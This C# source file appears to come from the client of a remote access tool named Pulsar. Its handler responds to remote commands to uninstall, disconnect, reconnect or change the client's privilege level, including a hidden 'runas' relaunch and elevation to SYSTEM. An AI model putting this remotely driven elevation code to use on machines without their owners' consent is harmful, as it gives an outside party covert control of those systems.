﻿using Pulsar.Client.Config;
using Pulsar.Client.Helper;
using Pulsar.Client.Networking;
using Pulsar.Client.Setup;
using Pulsar.Client.User;
using Pulsar.Client.Utilities;
using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.ClientManagement;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace Pulsar.Client.Messages
{
    public class ClientServicesHandler : IMessageProcessor
    {
        private readonly PulsarClient _client;

        private readonly PulsarApplication _application;

        public ClientServicesHandler(PulsarApplication application, PulsarClient client)
        {
            _application = application;
            _client = client;
        }

        /// <inheritdoc />
        public bool CanExecute(IMessage message) => message is DoClientUninstall ||
                                                             message is DoClientDisconnect ||
                                                             message is DoClientReconnect ||
                                                             message is DoAskElevate ||
                                                             message is DoElevateSystem ||
                                                             message is DoDeElevate;

        /// <inheritdoc />
        public bool CanExecuteFrom(ISender sender) => true;

        /// <inheritdoc />
        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoClientUninstall msg:
                    Execute(sender, msg);
                    break;
                case DoClientDisconnect msg:
                    Execute(sender, msg);
                    break;
                case DoClientReconnect msg:
                    Execute(sender, msg);
                    break;
                case DoAskElevate msg:
                    Execute(sender, msg);
                    break;
                case DoElevateSystem msg:
                    Execute(sender, msg);
                    break;
                case DoDeElevate msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoClientUninstall message)
        {
            client.Send(new SetStatus { Message = "Uninstalling... good bye :-(" });
            try
            {
                new ClientUninstaller().Uninstall();
                _client.Exit();
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Uninstall failed: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoClientDisconnect message)
        {
            _client.Exit();
        }

        private void Execute(ISender client, DoClientReconnect message)
        {
            _client.Disconnect();
        }

        private void Execute(ISender client, DoAskElevate message)
        {
            var userAccount = new UserAccount();
            if (userAccount.Type != AccountType.Admin)
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + Application.ExecutablePath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                _application.ApplicationMutex.Dispose();  // close the mutex so the new process can run
                try
                {
                    Process.Start(processStartInfo);
                }
                catch
                {
                    client.Send(new SetStatus {Message = "User refused the elevation request."});
                    _application.ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);  // re-grab the mutex
                    return;
                }
                _client.Exit();
            }
            else
            {
                client.Send(new SetStatus { Message = "Process already elevated." });
            }
        }

        private void Execute(ISender client, DoElevateSystem message)
        {
            //check if currently running as system. If not, use SystemElevation.Start() to elevate
            SystemElevation.Elevate(client);
        }

        private void Execute(ISender client, DoDeElevate message)
        {
            //check if currently running as system. If so, use SystemElevation.Stop() to de-elevate
            SystemElevation.DeElevate(client);
        }
    }
}
